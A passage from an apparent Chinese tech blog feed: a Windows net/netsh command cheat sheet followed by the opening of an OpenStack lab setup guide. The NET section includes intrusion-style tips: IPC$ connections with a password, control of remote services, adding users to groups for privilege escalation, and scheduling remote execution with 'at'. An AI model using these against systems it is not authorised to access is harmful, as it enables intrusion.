[&#x2F;set]<br>·\computername要检查或同步的服务器名<br>·&#x2F;domain[:name]指定要与其时间同步的域<br>·&#x2F;set使本计算机时钟与指定计算机或域的时钟同步</p><h3 id="Net-Start-Stop-Pause-Continue-启动-停止-暂停-重新激活服务，或显示已启动服务的列表"><a href="#Net-Start-Stop-Pause-Continue-启动-停止-暂停-重新激活服务，或显示已启动服务的列表" class="headerlink" title="Net Start|Stop|Pause|Continue  启动|停止|暂停|重新激活服务，或显示已启动服务的列表"></a>Net Start|Stop|Pause|Continue  启动|停止|暂停|重新激活服务，或显示已启动服务的列表</h3><p>格式：net Start|Stop|Pause|Continue service<br>&lt;1&gt;alerter(警报)<br>&lt;2&gt;client service for netware(Netware 客户端服务)<br>&lt;3&gt;clipbook server(剪贴簿服务器)<br>&lt;4&gt;computer browser(计算机浏览器)<br>&lt;5&gt;directory replicator(目录复制器)<br>&lt;6&gt;ftp publishing service (ftp )(ftp 发行服务)<br>&lt;7&gt;lpdsvc<br>&lt;8&gt;net logon(网络登录)<br>&lt;9&gt;network dde(网络 dde)<br>&lt;10&gt;network dde dsdm(网络 dde dsdm)<br>&lt;11&gt;network monitor agent(网络监控代理)<br>&lt;12&gt;nt lm security support provider(NT LM 安全性支持提供)<br>&lt;13&gt;ole(对象链接与嵌入)<br>&lt;14&gt;remote access connection manager(远程访问连接管理器)<br>&lt;15&gt;remote access isnsap service(远程访问 isnsap 服务)<br>&lt;16&gt;remote access server(远程访问服务器)<br>&lt;17&gt;remote procedure call (rpc) locator(远程过程调用定位器)<br>&lt;18&gt;remote procedure call (rpc) service(远程过程调用服务)<br>&lt;19&gt;schedule(调度)<br>&lt;20&gt;server(服务器)<br>&lt;21&gt;simple tcp&#x2F;ip services(简单 TCP&#x2F;IP 服务)<br>&lt;22&gt;snmp<br>&lt;23&gt;spooler(后台打印程序)<br>&lt;24&gt;tcp&#x2F;ip netbios helper(TCP&#x2F;IP NETBIOS 辅助工具)<br>&lt;25&gt;ups (26)workstation(工作站)<br>&lt;27&gt;messenger(信使)<br>&lt;28&gt;dhcp client</p><h3 id="Net-Statistics-显示本地工作站或服务器服务统计记录"><a href="#Net-Statistics-显示本地工作站或服务器服务统计记录" class="headerlink" title="Net Statistics  显示本地工作站或服务器服务统计记录"></a>Net Statistics  显示本地工作站或服务器服务统计记录</h3><p>格式：Net statistics [workstation | server]<br>·键入不带参数的Net statistics列出其统计信息可用的运行服务<br>·workstation显示本地工作站服务的统计信息<br>·server显示本地服务器服务的统计信息<br>  net statistics server | more    &#x2F;&#x2F;显示服务器服务统计信息</p><h3 id="Net-Session-列出或断开本地计算机和连接客户端的会话"><a href="#Net-Session-列出或断开本地计算机和连接客户端的会话" class="headerlink" title="Net Session  列出或断开本地计算机和连接客户端的会话"></a>Net Session  列出或断开本地计算机和连接客户端的会话</h3><p>格式：Net session [\computername] [&#x2F;delete]<br>·键入不带参数的Net session显示所有与本地计算机的会话的信息<br>·\computername标识要列出或断开会话的计算机<br>·&#x2F;delete结束与\computername计算机会话并关闭本次会话期间计算机的所有打开文件；如果省略\computername 参数，将取消与本地计算机的所有会话<br>  net session \GHQ     &#x2F;&#x2F;显示计算机名为GHQ的客户端会话信息列表</p><h3 id="Net-Send-向网络的其他用户、计算机或通信名发送消息"><a href="#Net-Send-向网络的其他用户、计算机或通信名发送消息" class="headerlink" title="Net Send  向网络的其他用户、计算机或通信名发送消息"></a>Net Send  向网络的其他用户、计算机或通信名发送消息</h3><p>格式：Net send {name | * | &#x2F;domain[:name] | &#x2F;users} message<br>·name要接收发送消息的用户名、计算机名或通信名<br>·* 将消息发送到组中所有名称<br>·&#x2F;domain[:name]将消息发送到计算机域中的所有名称<br>·&#x2F;users将消息发送到与服务器连接的所有用户<br>·message作为消息发送的文本<br>  net send &#x2F;users server will shutdown in 10 minutes<br>  &#x2F;&#x2F;给所有连接到服务器的用户发送消息</p><h3 id="Net-Config-显示当前运行的可配置服务，或显示并更改某项服务的设置"><a href="#Net-Config-显示当前运行的可配置服务，或显示并更改某项服务的设置" class="headerlink" title="Net Config  显示当前运行的可配置服务，或显示并更改某项服务的设置"></a>Net Config  显示当前运行的可配置服务，或显示并更改某项服务的设置</h3><p>格式：Net config [service [options]]<br>·键入不带参数的Net config显示可配置服务的列表<br>·service通过Net config命令进行配置的服务(server或workstation)<br>·options服务的特定选项</p><h2 id="Windows在命令行里设置ip地址"><a href="#Windows在命令行里设置ip地址" class="headerlink" title="Windows在命令行里设置ip地址"></a>Windows在命令行里设置ip地址</h2><p>netsh interface ip set address “本地连接” static 地址 子网掩码 网关<br>netsh interface ip set address “本地连接” dhcp<br>netsh interface ip set address “以太网” static 地址 子网掩码 网关</p><h2 id="netsh-Network-Shell"><a href="#netsh-Network-Shell" class="headerlink" title="netsh (Network Shell)"></a>netsh (Network Shell)</h2><p>netsh (Network Shell)是一个 windows 系统本身提供的功能强大的网络配置命令行工具。<br>导出配置脚本：netsh -c interface ip dump &gt; c:\interface.txt<br>导入配置脚本：netsh -f c:\interface.txt。<br>netsh interface ip show address - 显示 IP 地址<br>netsh interface ip show config - 显示更多详情<br>netsh interface ip show ipaddress - 显示 IP 地址类型<br>netsh interface ip show ipnet - 显示网络到媒体项目<br>netsh interface ip show route - 显示当前路由信息<br>netsh interface ip show interface - 显示接口信息<br>netsh interface ip set address “以太网” dhcp - 通过 DHCP 设置 IP 地址<br>netsh interface ip set address “以太网” static 10.1.2.10 255.255.255.0 10.1.2.254 - 设置以太网 IP 地址<br>netsh interface ip show dns - 显示 DNS 地址<br>netsh interface ip set dns “以太网” dhcp - 通过 DHCP 设置 DNS 地址<br>netsh interface ip set dns “以太网” static 10.0.12.8 - 设置以太网 DNS 地址，清除原有 DNS 设置<br>netsh interface ip add dns “以太网” 114.114.114.114 index&#x3D;2 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh interface ip add dns “以太网” 8.8.8.8 index&#x3D;3 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh interface ip add dns “以太网” 1.1.1.1 index&#x3D;4 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh interface ip add dns “以太网” 223.5.5.5 index&#x3D;5 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh -c interface dump &gt; d:\1.txt 导出配置到 D 盘并命名为 1.txt<br>netsh -f d:\2.txt 导入在 D 盘命名为 2.txt 的配置文件<br>C:\Users\Administrator&gt;netsh<br>abort – 丢弃在脱机模式下所做的更改。<br>add – 在项目列表上添加一个配置项目。<br>advfirewall – 更改到 <code>netsh advfirewall’ 上下文。 alias – 添加一个别名 branchcache – 更改到 </code>netsh branchcache’ 上下文。<br>bridge – 更改到 <code>netsh bridge’ 上下文。 bye – 退出程序。 commit – 提交在脱机模式中所做的更改。 delete – 在项目列表上删除一个配置项目。 dhcpclient – 更改到 </code>netsh dhcpclient’ 上下文。<br>dnsclient – 更改到 <code>netsh dnsclient’ 上下文。 dump – 显示一个配置脚本。 exec – 运行一个脚本文件。 exit – 退出程序。 firewall – 更改到 </code>netsh firewall’ 上下文。<br>help – 显示命令列表。<br>http – 更改到 <code>netsh http’ 上下文。 interface – 更改到 </code>netsh interface’ 上下文。<br>ipsec – 更改到 <code>netsh ipsec’ 上下文。 lan – 更改到 </code>netsh lan’ 上下文。<br>mbn – 更改到 <code>netsh mbn’ 上下文。 namespace – 更改到 </code>netsh namespace’ 上下文。<br>netio – 更改到 <code>netsh netio’ 上下文。 offline – 将当前模式设置成脱机。 online – 将当前模式设置成联机。 p2p – 更改到 </code>netsh p2p’ 上下文。<br>popd – 从堆栈上打开一个上下文。<br>pushd – 将当前上下文放入堆栈。<br>quit – 退出程序。<br>ras – 更改到 <code>netsh ras’ 上下文。 rpc – 更改到 </code>netsh rpc’ 上下文。<br>set – 更新配置设置。<br>show – 显示信息。<br>trace – 更改到 <code>netsh trace’ 上下文。 unalias – 删除一个别名。 wcn – 更改到 </code>netsh wcn’ 上下文。<br>wfp – 更改到 <code>netsh wfp’ 上下文。 winhttp – 更改到 </code>netsh winhttp’ 上下文。<br>winsock – 更改到 <code>netsh winsock’ 上下文。 wlan – 更改到 </code>netsh wlan’ 上下文。</p><blockquote><p>netsh winsock<br>audit – 显示已经安装和删除的 Winsock LSP 列表。<br>dump – 显示一个配置脚本。<br>help – 显示命令列表。<br>remove – 从系统中删除 Winsock LSP。<br>reset – 重置 Winsock 目录为清除状态。<br>set – 设置 Winsock 选项。<br>show – 显示信息。<br>netsh interface<br>6to4 – 更改到 <code>netsh interface 6to4′ 上下文。 ? – 显示命令列表。 dump – 显示一个配置脚本。 help – 显示命令列表。 httpstunnel – 更改到 </code>netsh interface httpstunnel’ 上下文。<br>ipv4 – 更改到 <code>netsh interface ipv4′ 上下文。 ipv6 – 更改到 </code>netsh interface ipv6′ 上下文。<br>isatap – 更改到 <code>netsh interface isatap’ 上下文。 portproxy – 更改到 </code>netsh interface portproxy’ 上下文。<br>set – 设置配置信息。<br>show – 显示信息。<br>tcp – 更改到 <code>netsh interface tcp’ 上下文。 teredo – 更改到 </code>netsh interface teredo’ 上下文。<br>netsh interface ipv4<br>add – 在一个表格中添加一个配置项。<br>delete – 从一个表格中删除一个配置项。<br>dump – 显示一个配置脚本。<br>help – 显示命令列表。<br>install – 安装 IP 协议。<br>reset – 重置 IP 配置。<br>set – 设置配置信息。<br>show – 显示信息。<br>uninstall – 卸载 IP 协议。<br>netsh interface ipv4 set<br>set address – 设定通向接口的 IP 地址或默认网关。<br>set compartment – 修改分段配置参数。<br>set dnsservers – 设置 DNS 服务器模式和地址。<br>set dynamicportrange – 修更改态端口分配所使用端口的范围。<br>set global – 修改全局配置常规参数。<br>set interface – 修改 IP 的接口配置参数。<br>set neighbors – 设置邻居地址。<br>set route – 修改路由参数。<br>set subinterface – 修改子接口配置参数。<br>set winsservers – 设置 WINS 服务器模式和地址。<br>netsh interface ipv4 show<br>show addresses – 显示 IP 地址配置。<br>show compartments – 显示分段参数。<br>show config – 显示 IP 地址和其他信息。<br>show destinationcache – 显示目标缓存项目。<br>show dnsservers – 显示 DNS 服务器地址。<br>show dynamicportrange – 显示动态端口范围配置参数。<br>show excludedportrange – 显示所有排除的端口范围。<br>show global – 显示全局配置普通参数。<br>show icmpstats – 显示 ICMP 统计。<br>show interfaces – 显示接口参数。<br>show ipaddresses – 显示当前 IP 地址。<br>show ipnettomedia – 显示 IP 的网络到媒体的映射。<br>show ipstats – 显示 IP 统计。<br>show joins – 显示加入的多播组。<br>show neighbors – 显示邻居缓存项。<br>show offload – 显示卸载信息。<br>show route – 显示路由表项目。<br>show subinterfaces – 显示子接口参数。<br>show tcpconnections – 显示 TCP 连接。<br>show tcpstats – 显示 TCP 统计。<br>show udpconnections – 显示 UDP 连接。<br>show udpstats – 显示 UDP 统计。<br>show winsservers – 显示 WINS 服务器地址。<br>netsh interface ipv4 add<br>add address – 将静态 IP 地址或默认网关添加到指定接口。<br>add dnsservers – 添加一个静态 DNS 服务器地址。<br>add excludedportrange – 为连续的端口块添加排除。<br>add neighbors – 添加邻居地址。<br>add route – 在接口上添加路由。<br>add winsservers – 添加一个静态 WINS 服务器地址。</p></blockquote><h2 id="Netsh命令详解"><a href="#Netsh命令详解" class="headerlink" title="Netsh命令详解"></a>Netsh命令详解</h2><p>Netsh是一个功能非常强大的系统内置命令。如果能了解一点常规操作的话，对管理员来说有时会有意想不到的帮助。比如我的客户的系统都是做过一些策略的。好多操作还必须在命令行下完成。下面简单介绍几个常用功能。其它的可以参考netsh的帮助文件。<br>　　netsh int ip set add “本地连接” static 192.168.1.188 255.255.255.0<br>　　Netsh是一个功能非常强大的系统内置命令。如果能了解一点常规操作的话，对管理员来说有时会有意想不到的帮助。比如我的客户的系统都是做过一些策略的。好多操作还必须在命令行下完成。下面简单介绍几个常用功能。其它的可以参考netsh的帮助文件。<br>　　a) 启用防火墙<br>　　C:&gt;netsh firewall set opmode mode &#x3D; enable<br>　　确定。<br>　　b) 关闭防火墙<br>　　C:&gt;netsh firewall set opmode mode &#x3D; disable<br>　　确定。<br>　　c) 重置防火墙<br>　　C:&gt;netsh firewall reset<br>　　确定。<br>　　1、查看网络配置<br>　　netsh interface ip show {选项}<br>　　{选项}可以是：<br>　　address   - 显示 IP 地址配置。<br>　　config    - 显示 IP 地址和更多信息。<br>　　dns       - 显示 DNS 服务器地址。<br>　　icmp      - 显示 ICMP 统计。<br>　　interface - 显示 IP 接口统计。<br>　　ipaddress - 显示当前 IP 地址<br>　　ipnet     - 显示 IP 的网络到媒体的映射。<br>　　ipstats   - 显示 IP 统计。<br>　　joins     - 显示加入的多播组。<br>　　offload   - 显示卸载信息。<br>　　tcpconn   - 显示 TCP 连接。<br>　　tcpstats - 显示 TCP 统计。<br>　　udpconn   - 显示 UDP 连接。<br>　　udpstats - 显示 UDP 统计。<br>　　wins      - 显示 WINS 服务器地址。<br>　　2、配置接口IP&#x2F;网关IP<br>　　netsh interface ip set address “本地连接” static 192.168.1.100 255.255.255.0 192.168.1.253<br>　　——————————<br>　　Microsoft Windows XP [版本 5.1.2600]<br>　　(C) 版权所有 1985-2001 Microsoft Corp.<br>　　C:&gt;netsh interface ip show config<br>　　接口 “本地连接” 的配置<br>　　DHCP 启用                        否<br>　　IP 地址                             192.168.1.100<br>　　子网掩码                            255.255.255.0<br>　　默认网关:                     192.168.1.253<br>　　GatewayMetric:                0<br>　　InterfaceMetric                     0<br>　　静态配置的 DNS 服务器:    202.96.209.134<br>　　静态配置的 WINS 服务器:   无<br>　　用哪个前缀注册:           只是主要<br>　　3、配置自动换取IP地址,DNS地址及wins地址<br>　　netsh interface ip set address “本地连接” dhcp<br>　　netsh interface ip set dns “本地连接” dhcp<br>　　netsh interface ip set wins “本地连接” dhcp<br>　　4、配置静态IP地址，DNS地址及wins地址<br>　　netsh interface ip set address “本地连接” static 192.168.1.253<br>　　netsh interface ip set dns “本地连接” static 202.96.209.6<br>　　netsh interface ip set wins “本地连接” static 192.168.1.1<br>　　5、查看并导出网络配置文件<br>　　C:&gt;netsh -c interface dump &gt;c:\dump.txt 　（”&gt;”表示导出。”&gt;&gt;”表示追加）<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　# 接口配置<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　pushd interface<br>　　reset all<br>　　popd<br>　　# 接口配置结束<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　# 接口配置<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　pushd interface ipv6<br>　　uninstall<br>　　popd<br>　　# 接口配置结束<br>　　# ———————————-<br>　　# ISATAP 配置<br>　　# ———————————-<br>　　pushd interface ipv6 isatap<br>　　popd<br>　　# ISATAP 配置结束<br>　　# ———————————-<br>　　# 6to4 配置<br>　　# ———————————-<br>　　pushd interface ipv6 6to4<br>　　reset<br>　　popd<br>　　# 6to4 配置结束<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　# 端口代理配置<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　pushd interface portproxy<br>　　reset<br>　　popd<br>　　# 端口代理配置结束<br>　　# ———————————-<br>　　# 接口 IP 配置<br>　　# ———————————-<br>　　pushd interface ip<br>　　# “本地连接” 的接口 IP 配置<br>　　set address name&#x3D;”本地连接” source&#x3D;static addr&#x3D;192.168.1.5 mask&#x3D;255.255.255.0<br>　　set address name&#x3D;”本地连接” gateway&#x3D;192.168.1.1 gwmetric&#x3D;0<br>　　set dns name&#x3D;”本地连接” source&#x3D;static addr&#x3D;202.96.209.134 register&#x3D;PRIMARY<br>　　set wins name&#x3D;”本地连接” source&#x3D;static addr&#x3D;none<br>　　popd<br>　　# 接口 IP 配置结束<br>　　6、导入网络配置文件<br>　　C:&gt;netsh -f c:\dump.txt<br>　　C:&gt;netsh exec c:\dump.txt<br>win7创建无线网<br>　　1、netsh wlan set hostednetwork mode&#x3D;allow ssid&#x3D;wwl key&#x3D;12346789<br>创建但必须使用已经连接网络进行共享到该无限上<br>　　2、netsh wlan start hostednetwork<br>开启无限wifi<br>　　3、netsh wlan stop hostednetwork<br>关闭无限wifi<br>　　4、netsh wlan show hostednetwork<br>查看wifi信息</p><p>检测网络连接禁用不明服务轻松检查账户<br>Net use &#x2F;u:aspnet<br>Netsvc.exe    netsvc rcmdsvc &#x2F;start<br>Sc.exe<br>Gpedit.msc<br>Gpupdate<br>Tracert<br>Pathping</p><h2 id="NET命令"><a href="#NET命令" class="headerlink" title="NET命令"></a>NET命令</h2><p>NET命令是功能强大的以命令行方式执行的工具。使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。 或者进行用户管理和登陆管理等。</p><p>net view \ip &#x2F;&#x2F;查看远程主机共享资源<br>net use x： \IP\sharename &#x2F;&#x2F; 把远程主机的某个共享资源影射为本地盘符<br>net use $”&gt;\IP\IPC$ “password” &#x2F;user：”name” &#x2F;&#x2F;建立IPC$连接<br>net start &#x2F;&#x2F;开启远程主机的服务<br>net stop &#x2F;&#x2F;关闭远程主机的服务</p><p>net user的一些命令<br>1.net user abcd 1234 &#x2F;add，新建一个用户名为abcd，密码为1234的帐户，默认为user组成员。<br>2.net user abcd &#x2F;del，将用户名为abcd的用户删除。<br>3，net user abcd &#x2F;active：no，将用户名为abcd的用户禁用。<br>4，net user abcd &#x2F;active：yes，激活用户名为abcd的用户。<br>5，net user abcd，查看用户名为abcd的用户的情况</p><p>net localgroup<br>列出本地用户组<br>好像可以对用户组进行提权<br>net localgroup groupname username &#x2F;add.</p><p>net time<br>查看远程主机的当前时间。(时间可是非常重要哦)<br>net time \ip</p><h2 id="at"><a href="#at" class="headerlink" title="at"></a>at</h2><p>这个命令的作用是安排在特定日期或时间执行某个特定的命令和程序。当我们知道了远程主机的当前时间，就可以利用此命令让其在以后的某个时间执行某个程序和命令。<br>at time command \computer</p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>功能强大的远程登陆命令。(默认是不开启的，需要手动开启)<br>命令窗口使用telent,输入IP，然后输入账号，密码就🆗了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows网络命令&quot;&gt;&lt;a href=&quot;#Windows网络命令&quot; class=&quot;headerlink&quot; title=&quot;Windows网络命令&quot;&gt;&lt;/a&gt;Windows网络命令&lt;/h2&gt;&lt;p&gt;开始——运行——CMD——提示符后面输入命令。上下箭头键的使用，上下</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://jielunya.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>搭建openstack平台</title>
    <link href="https://jielunya.github.io/2022/11/26/%E6%90%AD%E5%BB%BAopenstack%E5%B9%B3%E5%8F%B0/"/>
    <id>https://jielunya.github.io/2022/11/26/%E6%90%AD%E5%BB%BAopenstack%E5%B9%B3%E5%8F%B0/</id>
    <published>2022-11-25T20:38:03.000Z</published>
    <updated>2022-12-03T21:34:23.643Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置ip地址、配置主机名"><a href="#配置ip地址、配置主机名" class="headerlink" title="配置ip地址、配置主机名"></a>配置ip地址、配置主机名</h2><p>controller节点：<br>网卡1：192.168.100.10<br>网卡2：192.168.200.10<br>compute节点：<br>网卡1：192.168.100.20<br>网卡2：192.168.200.20</p><p>网卡1为仅主机模式，网卡2为NAT模式，两台虚拟机密码设置为000000</p><p>建议两台节点运行内存给到6G（6144MB）</p><h4 id="cotroller-ifcfg-ens33"><a href="#cotroller-ifcfg-ens33" class="headerlink" title="cotroller ifcfg-ens33"></a>cotroller ifcfg-ens33</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=4a667240-2f76-4ddc-b0b1-65bbe67ca7d5</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.100.10</span><br><span class="line">PREFIX=24</span><br></pre></td></tr></table></figure><h4 id="cotroller-ifcfg-ens34"><a href="#cotroller-ifcfg-ens34" class="headerlink" title="cotroller ifcfg-ens34"></a>cotroller ifcfg-ens34</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens34</span><br><span class="line">UUID=3de5461f-2339-4cda-8b46-4df997c74bd5</span><br><span class="line">DEVICE=ens34</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.200.10</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.200.2</span><br></pre></td></tr></table></figure><h4 id="compute-ifcfg-ens33"><a href="#compute-ifcfg-ens33" class="headerlink" title="compute ifcfg-ens33"></a>compute ifcfg-ens33</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=ef0eaa9c-1330-4616-85d7-9a91ac44a596</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.100.20</span><br><span class="line">PREFIX=24</span><br></pre></td></tr></table></figure><h4 id="compute-ifcfg-ens34"><a href="#compute-ifcfg-ens34" class="headerlink" title="compute ifcfg-ens34"></a>compute ifcfg-ens34</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens34</span><br><span class="line">UUID=fb2363f3-8c7b-4bca-a6e5-5e23827cc644</span><br><span class="line">DEVICE=ens34</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.200.20</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.200.2</span><br></pre></td></tr></table></figure><h4 id="配置主机名"><a href="#配置主机名" class="headerlink" title="配置主机名"></a>配置主机名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]hostnamectl set-hostname controller</span><br><span class="line">[root@compute ~]hostnamectl set-hostname compute</span><br></pre></td></tr></table></figure><h4 id="修改hosts文件将IP地址映射为主机名"><a href="#修改hosts文件将IP地址映射为主机名" class="headerlink" title="修改hosts文件将IP地址映射为主机名"></a>修改hosts文件将IP地址映射为主机名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]vi /etc/hosts</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line">[root@compute ~]vi /etc/hosts</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br></pre></td></tr></table></figure><h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><p>compute节点,添加一块200g硬盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@compute-pjl ~]# parted /dev/sdb</span><br><span class="line">GNU Parted 3.1</span><br><span class="line">使用 /dev/sdb</span><br><span class="line">Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.</span><br><span class="line">(parted) mklabel                                                          </span><br><span class="line">新的磁盘标签类型？ gpt                                                    </span><br><span class="line">(parted) mkpart cinder 1G 101G</span><br><span class="line">(parted) mkpart swift 101G 201G                                           </span><br><span class="line">(parted) q                                                                </span><br><span class="line">信息: You may need to update /etc/fstab.</span><br><span class="line"></span><br><span class="line">[root@compute-pjl ~]# mkfs.xfs /dev/sdb1</span><br><span class="line">[root@compute-pjl ~]# mkfs.xfs /dev/sdb2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置本地yum源"><a href="#配置本地yum源" class="headerlink" title="配置本地yum源"></a>配置本地yum源</h2><h4 id="【controller】"><a href="#【controller】" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]cd /etc/yum.repos.d/</span><br><span class="line">[root@controller ~]mkdir bak</span><br><span class="line">[root@controller ~]mv *.repo bak</span><br><span class="line">[root@controller ~]vi /etc/yum.repos.d/centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=file:///opt/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h4 id="【compute】"><a href="#【compute】" class="headerlink" title="【compute】"></a>【compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@compute ~]cd /etc/yum.repos.d/</span><br><span class="line">[root@compute ~]mkdir bak</span><br><span class="line">[root@compute ~]mv *.repo bak</span><br><span class="line">[root@compute ~]vi /etc/yum.repos.d/centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://192.168.100.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=ftp://192.168.100.10/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h2 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h2><h4 id="【controller】-1"><a href="#【controller】-1" class="headerlink" title="【controller】"></a>【controller】</h4><p>在虚拟机右下角设置CD&#x2F;DVD<br>选择CentOS-7-x86_64-DVD-1804.iso镜像，并连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mount -o loop /dev/cdrom /mnt/</span><br><span class="line">[root@controller ~]# mkdir /opt/centos</span><br><span class="line">[root@controller ~]# cp -rvf /mnt/* /opt/centos/</span><br><span class="line">[root@controller ~]# umount /mnt/</span><br></pre></td></tr></table></figure><p>在虚拟机右下角设置CD&#x2F;DVD<br>选择chinaskills_cloud_iaas.iso镜像，并连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mount -o loop /dev/cdrom /mnt/</span><br><span class="line">[root@controller ~]# cp -rvf /mnt/* /opt/</span><br><span class="line">[root@controller ~]# umount /mnt/</span><br></pre></td></tr></table></figure><h2 id="搭建ftp服务器，开启并设置自启"><a href="#搭建ftp服务器，开启并设置自启" class="headerlink" title="搭建ftp服务器，开启并设置自启"></a>搭建ftp服务器，开启并设置自启</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# yum install vsftpd –y</span><br><span class="line">[root@controller ~]# vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">末尾添加 anon_root=/opt/</span><br><span class="line">wq!保存退出</span><br><span class="line">[root@controller ~]# 